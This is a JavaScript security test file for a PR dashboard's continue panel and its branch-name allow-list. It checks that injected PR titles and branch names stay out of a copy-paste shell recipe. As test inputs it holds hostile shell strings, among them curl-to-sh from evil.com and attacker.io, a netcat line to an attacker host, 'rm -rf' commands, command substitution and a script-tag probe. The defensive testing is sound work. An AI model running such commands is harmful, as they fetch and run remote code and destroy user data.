// Security tests for renderContinuePanel and isSafeBranchName.
//
// Original v7 rendered `claude "${primer}"` where `primer` included the
// PR title verbatim (only " -> ' replacement). Titles are attacker-
// controllable (anyone who can open an issue can influence the eventual
// PR title). Backticks / $(...) / ; / && / | inside a title would
// execute on the reviewer's Mac when they copy-paste the recipe.
//
// The fix separates the shell recipe (fixed 2-line git + `claude`)
// from the "prompt for Claude" (its own copy-block the reviewer pastes
// INTO Claude AFTER the CLI is running). Branch name is now allow-
// listed via isSafeBranchName so a malicious branch cannot smuggle
// metacharacters either.
//
// Run: node --test tools/shift-dashboard/__tests__/continuePanelSafety.test.mjs

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { renderContinuePanel, isSafeBranchName } from '../worker.js';

// ─── isSafeBranchName ────────────────────────────────────────────────

test('isSafeBranchName: accepts normal branch names', () => {
  assert.equal(isSafeBranchName('main'), true);
  assert.equal(isSafeBranchName('Staging'), true);
  assert.equal(isSafeBranchName('day-shift-staging-2026-08-04'), true);
  assert.equal(isSafeBranchName('feat/dashboard-5th-grader-1214'), true);
  assert.equal(isSafeBranchName('release/2.1.0'), true);
});

test('isSafeBranchName: rejects shell metacharacters', () => {
  for (const evil of [
    'main;rm -rf ~',                    // command separator
    'main && curl evil.com | sh',       // command chain
    'main`whoami`',                     // command substitution (backticks)
    'main$(whoami)',                    // command substitution ($(...))
    'main|nc attacker 4444',            // pipe
    'main"; rm -rf /',                  // double-quote escape
    "main'; rm -rf /",                  // single-quote escape
    'main\nrm -rf ~',                   // newline injection
    'main\trm',                         // tab
    'main  space-in-name',              // spaces (also invalid for git)
  ]) {
    assert.equal(isSafeBranchName(evil), false, `should reject: ${JSON.stringify(evil)}`);
  }
});

test('isSafeBranchName: rejects null / undefined / non-string', () => {
  assert.equal(isSafeBranchName(null), false);
  assert.equal(isSafeBranchName(undefined), false);
  assert.equal(isSafeBranchName(123), false);
  assert.equal(isSafeBranchName({}), false);
  assert.equal(isSafeBranchName([]), false);
});

test('isSafeBranchName: rejects absurdly long names (bomb / DOS guard)', () => {
  assert.equal(isSafeBranchName('a'.repeat(300)), false);
  assert.equal(isSafeBranchName('a'.repeat(250)), true);   // 250 exactly - inclusive
  assert.equal(isSafeBranchName('a'.repeat(251)), false);  // 251 - reject
});

// ─── renderContinuePanel: shell-injection defence ────────────────────

test('renderContinuePanel: title with backticks does NOT reach the shell recipe', () => {
  const pr = {
    number: 1234,
    base: 'feat/x',
    title: 'fix: crash `whoami` here',
    body: '',
  };
  const html = renderContinuePanel(pr, { repo: 'org/repo' });
  // Recipe block (the one the user pastes into their SHELL) should be the
  // fixed git-commands-only shape. Verify the shell block does NOT contain
  // the backtick-bearing title.
  //
  // Structure: two <pre class="recipe"> blocks. The FIRST is the shell
  // recipe (git fetch/checkout + start claude). The SECOND is the primer
  // (pasted into Claude, NEVER touches a shell).
  const shellBlockMatch = html.match(/<p class="continue-hint">1\.[\s\S]*?<pre class="recipe">([\s\S]*?)<\/pre>/);
  assert.ok(shellBlockMatch, 'first (shell) recipe block should be present');
  const shellBlock = shellBlockMatch[1];
  assert.ok(!shellBlock.includes('`whoami`'), 'shell block MUST NOT contain the backtick-bearing title text');
  assert.ok(!shellBlock.includes('whoami'), 'shell block MUST NOT contain the title body at all');
  assert.ok(shellBlock.includes('git fetch origin feat/x'), 'shell block SHOULD contain the fixed git commands');
});

test('renderContinuePanel: title with $() command substitution does NOT reach the shell', () => {
  const pr = {
    number: 5,
    base: 'main',
    title: 'benign title $(curl evil.com/shell | sh)',
    body: '',
  };
  const html = renderContinuePanel(pr, { repo: 'org/repo' });
  const shellBlockMatch = html.match(/<p class="continue-hint">1\.[\s\S]*?<pre class="recipe">([\s\S]*?)<\/pre>/);
  const shellBlock = shellBlockMatch[1];
  assert.ok(!shellBlock.includes('curl evil.com'), 'shell block MUST NOT contain the injection payload');
  assert.ok(!shellBlock.includes('$(curl'), 'shell block MUST NOT contain $(...) substitution text');
});

test('renderContinuePanel: title with ; && | does NOT reach the shell', () => {
  const pr = {
    number: 7,
    base: 'main',
    title: 'fix; rm -rf ~ && curl attacker.io | sh',
    body: '',
  };
  const html = renderContinuePanel(pr, { repo: 'org/repo' });
  const shellBlockMatch = html.match(/<p class="continue-hint">1\.[\s\S]*?<pre class="recipe">([\s\S]*?)<\/pre>/);
  const shellBlock = shellBlockMatch[1];
  assert.ok(!shellBlock.includes('rm -rf'), 'shell block MUST NOT contain rm -rf');
  assert.ok(!shellBlock.includes('attacker.io'), 'shell block MUST NOT contain the injected URL');
  assert.ok(!shellBlock.includes(' && '), 'shell block MUST NOT contain && from the title');
});

test('renderContinuePanel: unsafe branch renders a warning, no recipe at all', () => {
  const pr = {
    number: 1,
    base: 'main`rm -rf ~`',
    title: 'harmless title',
    body: '',
  };
  const html = renderContinuePanel(pr, { repo: 'org/repo' });
  assert.ok(!html.includes('<pre class="recipe">'), 'no recipe block when branch is unsafe');
  assert.ok(html.includes('continue-warning'), 'renders the warning instead');
  // The warning DOES include the branch name in escaped form for the
  // reviewer's context - verify it is HTML-escaped so it does not become
  // a live element.
  assert.ok(!html.includes('main`rm -rf ~`'), 'unsafe branch name should not appear verbatim');
});

test('renderContinuePanel: primer block DOES include the title (that block does not touch a shell)', () => {
  const pr = {
    number: 42,
    base: 'main',
    title: 'fix(auth): remember last used login method',
    body: '',
  };
  const html = renderContinuePanel(pr, { repo: 'org/repo' });
  // The second <pre class="recipe"> block is the primer for Claude - it
  // includes the title verbatim (HTML-escaped) because the user pastes
  // it INTO Claude's prompt, not into a shell. That is safe.
  const primerBlockMatch = html.match(/2\.[\s\S]*?<pre class="recipe">([\s\S]*?)<\/pre>/);
  assert.ok(primerBlockMatch, 'primer block should be present');
  const primerBlock = primerBlockMatch[1];
  assert.ok(primerBlock.includes('fix(auth): remember last used login method'), 'primer block SHOULD include the title (safe: paste into Claude, not shell)');
  assert.ok(primerBlock.includes('#42'), 'primer references the PR number');
});

test('renderContinuePanel: HTML-escaping applied throughout (defence in depth)', () => {
  const pr = {
    number: 99,
    base: 'main',
    title: '<script>alert(1)</script>',
    body: '',
  };
  const html = renderContinuePanel(pr, { repo: 'org/repo' });
  assert.ok(!html.includes('<script>alert(1)</script>'), 'raw script tag must not appear');
  assert.ok(html.includes('&lt;script&gt;'), 'title is HTML-escaped in the primer block');
});
